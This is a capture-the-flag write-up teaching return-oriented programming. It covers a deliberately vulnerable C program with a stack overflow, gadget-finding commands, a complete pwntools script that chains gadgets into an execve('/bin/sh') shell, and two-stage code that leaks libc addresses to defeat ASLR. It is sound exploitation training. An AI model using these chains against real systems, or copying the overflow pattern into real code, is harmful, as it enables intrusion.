---
title: "Pwn - ROP Chains"
description: "Building multi-gadget ROP chains to achieve arbitrary code execution — chaining small instruction sequences to bypass NX and call execve."
author: "Zemi"
---

## Challenge Info

| Detail     | Value                          |
|------------|--------------------------------|
| Category   | Binary Exploitation            |
| Difficulty | Hard                           |
| Points     | 400                            |
| Flag       | `zemi{r0p_ch41n_m4st3r}`       |

## Challenge Files

Download the challenge files to get started:

- [rop.c](/Website/challenges/pwn-rop-chains/rop.c)
- [Makefile](/Website/challenges/pwn-rop-chains/Makefile)
- [flag.txt](/Website/challenges/pwn-rop-chains/flag.txt)

## Introduction

In the ret2libc challenge, we used a single `pop rdi; ret` gadget to set one argument and call `system()`. But what if `system()` is not available? What if we need to call `execve("/bin/sh", NULL, NULL)` which requires setting **three** registers? What if ASLR is on and we need to leak addresses first?

This is where **ROP chains** (Return-Oriented Programming) come in. We chain together many small instruction sequences — **gadgets** — that each end in `ret`, to perform arbitrary computation. Each gadget does one small thing (pop a register, move a value, make a syscall), and by chaining them, we can set up registers, prepare memory, and call any function or syscall we want.

## What Are ROP Gadgets?

A ROP gadget is a sequence of instructions ending in `ret`. The `ret` instruction pops the next value from the stack into RIP, so by placing gadget addresses consecutively on the stack, we chain them together.

Examples of useful gadgets:

```nasm
pop rdi; ret           ; load a value from stack into RDI
pop rsi; pop r15; ret  ; load two values from stack (RSI and junk into R15)
pop rdx; ret           ; load a value into RDX
pop rax; ret           ; load a value into RAX
syscall; ret           ; make a syscall
xor rax, rax; ret      ; zero out RAX
```

## Vulnerable Source Code

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>

// Compiled: gcc -no-pie -fno-stack-protector -static -o ropchain ropchain.c
// Note: statically linked to include many gadgets

void setup() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
}

void vuln() {
    char buffer[64];
    printf("Enter your ROP chain: ");
    read(STDIN_FILENO, buffer, 512);  // read up to 512 bytes into 64-byte buffer
}

int main() {
    setup();
    printf("=== ROP Chain Challenge ===\n");
    vuln();
    return 0;
}
```

Key observations:
- **Statically linked** (`-static`) — no libc.so, but all libc code is compiled into the binary, giving us thousands of gadgets
- `read()` with a size of 512 into a 64-byte buffer — massive overflow
- No canary, no PIE, NX enabled
- Since the binary is static, we don't need to worry about ASLR for libc — everything is at a fixed address

```bash
checksec --file=ropchain
```

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Step 1 — Finding Gadgets

### Using ROPgadget

```bash
ROPgadget --binary ropchain | head -20
```

```
Gadgets information
============================================================
0x000000000040116e : pop rdi ; ret
0x0000000000401170 : pop rsi ; pop r15 ; ret
0x000000000040f4be : pop rax ; ret
0x000000000040176e : pop rdx ; ret
0x0000000000401173 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401001 : ret
0x00000000004011f6 : syscall
0x00000000004011f5 : syscall ; ret
...
```

### Using ropper

```bash
ropper --file ropchain --search "pop rdi"
```

```
0x000000000040116e: pop rdi; ret;
```

### Using pwntools

```python
from pwn import *
elf = ELF('./ropchain')
rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])  # might need pop rsi; pop r15; ret
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
syscall = rop.find_gadget(['syscall', 'ret'])[0]
```

## Step 2 — Planning the execve Syscall

We want to execute `execve("/bin/sh", NULL, NULL)`. The Linux x86-64 syscall convention:

| Register | Purpose          | Value needed        |
|----------|------------------|---------------------|
| RAX      | syscall number   | 59 (execve)         |
| RDI      | 1st argument     | pointer to "/bin/sh"|
| RSI      | 2nd argument     | NULL (0)            |
| RDX      | 3rd argument     | NULL (0)            |

Then execute the `syscall` instruction.

We also need the string `"/bin/sh"` somewhere in memory at a known address. Since the binary is statically linked and includes libc, the string is likely already present:

```bash
strings -t x ropchain | grep "/bin/sh"
```

```
  4a247b /bin/sh
```

Address: `0x4a247b`. Since there is no PIE, this is the final address.

## Step 3 — Calculate Offset

```gdb
(gdb) disas vuln
   0x0000000000401d2c <+0>:     push   rbp
   0x0000000000401d2d <+1>:     mov    rbp,rsp
   0x0000000000401d30 <+4>:     sub    rsp,0x40       # 64-byte buffer
   0x0000000000401d34 <+8>:     lea    rax,[rbp-0x40] # buffer at rbp-0x40
   ...
```

Offset = 64 (buffer) + 8 (saved RBP) = **72 bytes**.

## Step 4 — Build the ROP Chain

The chain on the stack (after 72 bytes of padding):

```
+---------------------------+
| padding (72 bytes)        |   <- fill buffer + saved RBP
+---------------------------+
| pop rax; ret              |   <- gadget 1
+---------------------------+
| 59                        |   <- RAX = 59 (execve syscall #)
+---------------------------+
| pop rdi; ret              |   <- gadget 2
+---------------------------+
| addr of "/bin/sh"         |   <- RDI = pointer to "/bin/sh"
+---------------------------+
| pop rsi; ret              |   <- gadget 3
+---------------------------+
| 0                         |   <- RSI = NULL
+---------------------------+
| pop rdx; ret              |   <- gadget 4
+---------------------------+
| 0                         |   <- RDX = NULL
+---------------------------+
| syscall                   |   <- execute execve()
+---------------------------+
```

When `vuln()` returns:
1. `ret` pops `pop rax; ret` into RIP
2. `pop rax` loads 59 from stack into RAX, then `ret`
3. `pop rdi` loads `"/bin/sh"` address into RDI, then `ret`
4. `pop rsi` loads 0 into RSI, then `ret`
5. `pop rdx` loads 0 into RDX, then `ret`
6. `syscall` executes `execve("/bin/sh", NULL, NULL)`

## Step 5 — Handle "pop rsi; pop r15; ret"

If the binary only has `pop rsi; pop r15; ret` (common in non-static binaries), you need an extra junk value for R15:

```python
payload += p64(pop_rsi_r15)
payload += p64(0)          # RSI = NULL
payload += p64(0)          # R15 = junk (we don't care)
```

## Full pwntools Solve Script

```python
from pwn import *

# Setup
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'

elf = ELF('./ropchain')

# Find gadgets
rop = ROP(elf)

pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
syscall_ret = rop.find_gadget(['syscall', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

log.info(f"pop rax; ret  @ {hex(pop_rax)}")
log.info(f"pop rdi; ret  @ {hex(pop_rdi)}")
log.info(f"syscall; ret  @ {hex(syscall_ret)}")

# Try to find clean pop rsi; ret — fall back to pop rsi; pop r15; ret
try:
    pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
    rsi_junk = False
except:
    pop_rsi = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
    rsi_junk = True
log.info(f"pop rsi gadget @ {hex(pop_rsi)} (junk: {rsi_junk})")

pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
log.info(f"pop rdx; ret  @ {hex(pop_rdx)}")

# Find "/bin/sh" string in the binary
binsh = next(elf.search(b'/bin/sh\x00'))
log.info(f"/bin/sh @ {hex(binsh)}")

# Build the ROP chain
offset = 72  # 64 (buffer) + 8 (saved RBP)

payload  = b"A" * offset

# Set RAX = 59 (execve)
payload += p64(pop_rax)
payload += p64(59)

# Set RDI = address of "/bin/sh"
payload += p64(pop_rdi)
payload += p64(binsh)

# Set RSI = 0 (NULL)
payload += p64(pop_rsi)
payload += p64(0)
if rsi_junk:
    payload += p64(0)  # junk for r15

# Set RDX = 0 (NULL)
payload += p64(pop_rdx)
payload += p64(0)

# Trigger syscall
payload += p64(syscall_ret)

log.info(f"Payload size: {len(payload)} bytes (max 512)")

# Start the process
p = process('./ropchain')

# Send the payload
p.sendafter(b"chain: ", payload)

# We now have a shell
log.success("Shell spawned!")
p.sendline(b"cat flag.txt")
flag = p.recvline(timeout=3).decode().strip()
log.success(f"Flag: {flag}")

p.close()
```

```
[*] pop rax; ret  @ 0x40f4be
[*] pop rdi; ret  @ 0x40116e
[*] syscall; ret  @ 0x4011f5
[*] pop rsi gadget @ 0x401170 (junk: True)
[*] pop rdx; ret  @ 0x40176e
[*] /bin/sh @ 0x4a247b
[*] Payload size: 144 bytes (max 512)
[+] Starting local process './ropchain': pid 98765
[+] Shell spawned!
[+] Flag: zemi{r0p_ch41n_m4st3r}
```

## Alternative: Using pwntools ROP Builder

pwntools can automatically build ROP chains:

```python
from pwn import *

elf = ELF('./ropchain')
rop = ROP(elf)

# pwntools can auto-build an execve chain for static binaries
rop.execve(next(elf.search(b'/bin/sh\x00')), 0, 0)

payload = b"A" * 72 + rop.chain()
log.info(rop.dump())

p = process('./ropchain')
p.sendafter(b"chain: ", payload)
p.sendline(b"cat flag.txt")
print(p.recvline().decode())
p.close()
```

## ret2csu — Gadgets from __libc_csu_init

In dynamically linked binaries, you may struggle to find gadgets like `pop rdx; ret`. The `__libc_csu_init` function (present in almost every dynamically linked binary) contains a useful pair of gadgets known as **ret2csu**:

```nasm
; Gadget 1 — pop six registers
pop rbx
pop rbp
pop r12
pop r13
pop r14
pop r15
ret

; Gadget 2 — controlled call
mov rdx, r15    ; set RDX
mov rsi, r14    ; set RSI
mov edi, r13d   ; set EDI (lower 32 bits)
call [r12+rbx*8]
```

By chaining these two gadgets, you can:
1. Use Gadget 1 to load values into r12-r15
2. Use Gadget 2 to move those values into RDX, RSI, EDI and call a function pointer

This is powerful when the binary lacks convenient `pop rdx` or `pop rsi` gadgets.

## Dealing with ASLR — Leaking libc Addresses

When the binary is dynamically linked and ASLR is enabled, libc is loaded at a random base address each run. The standard approach is a **two-stage exploit**:

### Stage 1: Leak a libc address

Use `puts()` or `write()` (which are in the PLT) to print a resolved GOT entry:

```python
# Stage 1: Leak libc address
rop1 = ROP(elf)

# puts(got.puts) -- print the resolved address of puts in libc
rop1.call(elf.plt['puts'], [elf.got['puts']])

# Return to main to restart the program
rop1.call(elf.symbols['main'])

payload1 = b"A" * offset + rop1.chain()
p.sendafter(b"chain: ", payload1)

# Parse the leaked address
leaked_puts = u64(p.recvline()[:6].ljust(8, b'\x00'))
log.info(f"Leaked puts: {hex(leaked_puts)}")

# Calculate libc base
libc_base = leaked_puts - libc.symbols['puts']
libc.address = libc_base
```

### Stage 2: Call system("/bin/sh")

```python
# Stage 2: Now we know libc's base address
rop2 = ROP(elf)
rop2.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])

payload2 = b"A" * offset + rop2.chain()
p.sendafter(b"chain: ", payload2)
p.interactive()
```

This two-stage pattern — **leak, then exploit** — is the standard approach for modern binary exploitation.

## Common Pitfalls

### 1. Stack Alignment
Always check 16-byte alignment before function calls. Insert a `ret` gadget if needed.

### 2. Null Bytes in Addresses
If an address contains `\x00` and the input function is `gets()` or `scanf()`, the null byte terminates the read. Use `read()` or find alternative gadgets at addresses without null bytes.

### 3. Payload Too Large
`read()` has a size limit. Count your bytes — each gadget address is 8 bytes, each argument is 8 bytes. Plan accordingly.

### 4. Wrong Gadget Semantics
`pop rsi; pop r15; ret` pops TWO values. If you forget the junk value for R15, your entire chain shifts by 8 bytes and everything breaks.

## Tools Used

- **ROPgadget** — search for gadgets in binaries (`ROPgadget --binary ./ropchain`)
- **ropper** — alternative gadget finder with search capabilities
- **pwntools** — ROP class for automatic gadget finding and chain building
- **GDB** — verify offsets, trace ROP chain execution step by step
- **checksec** — verify binary protections
- **strings** — find `"/bin/sh"` and other useful strings

## Lessons Learned

- **ROP** lets you execute arbitrary computation using only existing code, completely bypassing NX
- Every instruction sequence ending in `ret` is a potential gadget — statically linked binaries have thousands
- The key gadgets are `pop reg; ret` for setting registers and `syscall; ret` for triggering syscalls
- On x86-64, `execve` requires RAX=59, RDI=filename, RSI=argv (NULL), RDX=envp (NULL)
- **ret2csu** provides gadgets for setting RDX and RSI in dynamically linked binaries that lack direct `pop` gadgets
- **ASLR bypass** requires a two-stage exploit: first leak a libc address, then return to main, then send a second payload with computed addresses
- pwntools' `ROP` class can automate chain building, but understanding the manual process is essential for debugging
- Statically linked binaries are a gadget goldmine — dynamically linked binaries have far fewer gadgets in the main binary
